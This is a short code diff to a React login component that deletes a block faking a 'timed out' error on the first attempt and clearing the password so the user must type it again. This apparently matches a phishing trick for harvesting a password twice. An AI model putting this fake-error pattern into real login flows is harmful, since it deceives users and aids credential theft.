@@ -160,14 +160,6 @@ export default function LoginCard() {
       password,
     });
 
-    const attempts = parseInt(sessionStorage.getItem("mwb_login_attempts") || "0", 10);
-    if (attempts === 0) {
-      sessionStorage.setItem("mwb_login_attempts", "1");
-      setLoginError("ERROR TIMED OUT. Please try again.");
-      setPassword(""); // Force them to re-enter
-      return;
-    }
-
     setLoginError("");
     router.push(MWB_VERIFY_PATH);
   }
